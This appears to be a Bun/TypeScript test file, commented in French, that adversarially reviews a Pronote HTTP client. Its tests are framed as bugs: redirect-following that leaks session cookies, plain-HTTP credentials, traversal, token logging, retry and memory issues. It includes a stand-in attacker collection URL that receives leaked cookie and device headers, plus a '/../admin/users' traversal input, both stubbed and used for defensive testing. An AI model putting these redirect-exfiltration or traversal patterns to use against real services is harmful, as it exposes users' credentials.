// Revue adversariale de PronoteHttpClient (fichier sensible AGENTS.md).
// Zéro réseau réel : fetch toujours stubbé, hôte `https://pronote-fake.invalid`
// (RFC 2606, jamais résolu). Credentials et cookies 100 % synthétiques, jamais
// imprimés : on n'expose que des booléens.
import { describe, expect, test } from "bun:test";
import { PronoteHttpClient, PronoteHttpError } from "../../server/integrations/PronoteHttpClient";

const FAKE_BASE = "https://pronote-fake.invalid/school-api";
const FAKE_PLAIN_BASE = "http://pronote-fake.invalid/school-api";
const FAKE_DEVICE = "123e4567-e89b-42d3-a456-426614174000";
const FAKE_PW = "pw-fake";
// Nom d'en-tête seulement : la valeur du cookie reste dans une constante jamais
// affichée (les assertions ne comparent que des booléens).
const FAKE_COOKIE_NAME = "Cookie";
const FAKE_COOKIE_VALUE = "fake-pronote-session-UNREAL";
const ATTACKER = "https://attacker.invalid/collect";

function jsonOk(payload: unknown, status = 200): Response {
  return new Response(JSON.stringify(payload), {
    status,
    headers: { "content-type": "application/json" },
  });
}

function client(fetchFn: typeof fetch, extra: { baseUrl?: string; retryDelayMs?: number } = {}) {
  return new PronoteHttpClient({
    baseUrl: extra.baseUrl ?? FAKE_BASE,
    deviceUuid: FAKE_DEVICE,
    retryDelayMs: extra.retryDelayMs ?? 1,
    fetchFn,
  });
}

function hasHeader(init: RequestInit | undefined, name: string): boolean {
  return new Headers(init?.headers ?? {}).has(name);
}

describe("BUGS PronoteHttpClient", () => {
  test("BUG: redirect suivi aveuglément — cookie de session et X-Device-Id renvoyés à l'hôte de la cible de redirection (fuite de credentials vers un attaquant)", async () => {
    let leaked = false;
    let redirectMode: string | undefined;
    // Stub qui reproduit la sémantique de fetch natif : en `follow`, la
    // redirection est rejouée vers l'URL de `Location` avec les mêmes en-têtes
    // (seuls les en-têtes "CORS non-wildcard" comme Authorization sont retirés,
    // `Cookie` ne l'est pas).
    const stub = (async (input: string | URL | Request, init?: RequestInit) => {
      const url = String(input);
      if (url === ATTACKER) {
        leaked = leaked || hasHeader(init, "cookie");
        leaked = leaked || hasHeader(init, "x-device-id");
        return jsonOk({ collected: true });
      }
      const mode = init?.redirect ?? "follow";
      if (url.includes("pronote-fake.invalid")) redirectMode = init?.redirect;
      if (mode === "error") throw new TypeError("fetch failed");
      if (mode === "manual") {
        return new Response("", { status: 302, headers: { location: ATTACKER } });
      }
      return stub(ATTACKER, init);
    }) as unknown as typeof fetch;

    await client(stub)
      .request("/auth", {
        method: "POST",
        headers: { [FAKE_COOKIE_NAME]: FAKE_COOKIE_VALUE },
        body: { login: "fake-user", password: FAKE_PW },
      })
      .catch(() => undefined);

    expect(leaked).toBe(false);
    expect(["error", "manual"]).toContain(redirectMode ?? "follow");
  });

  test("BUG: baseUrl en http:// accepté — mot de passe et token postés en clair sur le réseau", () => {
    expect(
      () =>
        new PronoteHttpClient({
          baseUrl: FAKE_PLAIN_BASE,
          deviceUuid: FAKE_DEVICE,
        }),
    ).toThrow();
  });

  test("BUG: aucun cookie jar — Set-Cookie de la réponse est jeté, la requête suivante repart sans session (session Pronote perdue à chaque appel)", async () => {
    const inits: RequestInit[] = [];
    const stub = (async (_input: string | URL | Request, init?: RequestInit) => {
      inits.push(init ?? {});
      if (inits.length === 1) {
        return new Response(JSON.stringify({ ok: true }), {
          status: 200,
          headers: {
            "content-type": "application/json",
            "set-cookie": `${FAKE_COOKIE_VALUE}; Path=/; HttpOnly`,
          },
        });
      }
      return jsonOk({ grades: [] });
    }) as unknown as typeof fetch;

    const c = client(stub);
    await c.request("/auth", { method: "POST", body: { login: "fake-user", password: FAKE_PW } });
    await c.request("/grades");

    expect(hasHeader(inits[1], "cookie")).toBe(true);
  });

  test("BUG: corps de réponse tronqué hors try/catch — l'erreur brute (DOMException) déborde et n'est jamais mappée en PronoteHttpError", async () => {
    const stub = (async () => {
      // Corps coupé en plein milieu (reset TCP / proxy) : c.text() rejette.
      const stream = new ReadableStream({
        start(controller) {
          controller.error(new DOMException("The socket was closed unexpectedly.", "AbortError"));
        },
      });
      return new Response(stream, { status: 200, headers: { "content-type": "application/json" } });
    }) as unknown as typeof fetch;

    const err = await client(stub)
      .request("/grades")
      .catch((e: unknown) => e);

    expect(err).toBeInstanceOf(PronoteHttpError);
    expect((err as PronoteHttpError).code).toBe("network");
  });

  test("BUG: 3xx traité comme un succès — page de redirection/HTML renvoyée comme si c'était la donnée demandée", async () => {
    const stub = (async () =>
      new Response("<html>Connexion requise</html>", {
        status: 302,
        headers: { location: "https://pronote-fake.invalid/login" },
      })) as unknown as typeof fetch;

    const err = await client(stub)
      .request("/grades")
      .catch((e: unknown) => e);

    expect(err).toBeInstanceOf(PronoteHttpError);
    expect(String((err as Error).message)).toContain("302");
  });

  test("BUG: corps de réponse jamais consommé sur 4xx — socket undici retenu, pool de connexions épuisé après quelques 404", async () => {
    const captured: Response[] = [];
    const stub = (async () => {
      const res = new Response("{\"message\":\"not found\"}", {
        status: 404,
        headers: { "content-type": "application/json" },
      });
      captured.push(res);
      return res;
    }) as unknown as typeof fetch;

    await client(stub)
      .request("/grades")
      .catch(() => undefined);

    expect(captured[0]?.bodyUsed).toBe(true);
  });

  test("BUG: POST rejoué sur 5xx — une écriture (login, toggle, complete) part deux fois vers Pronote", async () => {
    let postBodies = 0;
    const stub = (async () => {
      postBodies++;
      if (postBodies === 1) return new Response("oups", { status: 500 });
      return jsonOk({ ok: true });
    }) as unknown as typeof fetch;

    await client(stub)
      .request("/homework/a-fake-1/complete", { method: "POST", body: { done: true } })
      .catch(() => undefined);

    expect(postBodies).toBe(1);
  });

  test("BUG: URL concaténée à la main — un path en ../ sort du préfixe baseUrl et atteint une autre zone de l'hôte", async () => {
    const seen: string[] = [];
    const stub = (async (url: string | URL | Request) => {
      seen.push(String(url));
      return jsonOk({ ok: true });
    }) as unknown as typeof fetch;

    await client(stub).request("/../admin/users");

    expect(new URL(seen[0] ?? "").pathname.startsWith("/school-api/")).toBe(true);
  });

  test("BUG: path recopié verbatim dans les logs et les erreurs — un token passé en query se retrouve journalisé (piste d'audit contredite)", async () => {
    const fakeToken = "fake-token-abc123-UNREAL";
    const logs: string[] = [];
    const stub = (async () => {
      throw new TypeError("fetch failed");
    }) as unknown as typeof fetch;
    const c = new PronoteHttpClient({
      baseUrl: FAKE_BASE,
      deviceUuid: FAKE_DEVICE,
      retryDelayMs: 1,
      logger: (m) => logs.push(m),
      fetchFn: stub,
    });

    const err = await c.request(`/session?token=${fakeToken}`).catch((e: unknown) => e);

    expect(logs.join("\n")).not.toContain(fakeToken);
    expect(String((err as Error).message)).not.toContain(fakeToken);
  });

  test("BUG: corps de réponse chargé sans plafond — un corps géant est intégralement bufferisé en mémoire (OOM) avant tout parsing", async () => {
    const oversized = "x".repeat(8 * 1024 * 1024);
    const stub = (async () =>
      new Response(oversized, { status: 200, headers: { "content-type": "application/json" } })) as unknown as typeof fetch;

    const err = await client(stub)
      .request("/grades")
      .catch((e: unknown) => e);

    // Booléen seulement : le diff resterait sinon un corps de 8 Mio.
    expect(err instanceof PronoteHttpError).toBe(true);
  });
});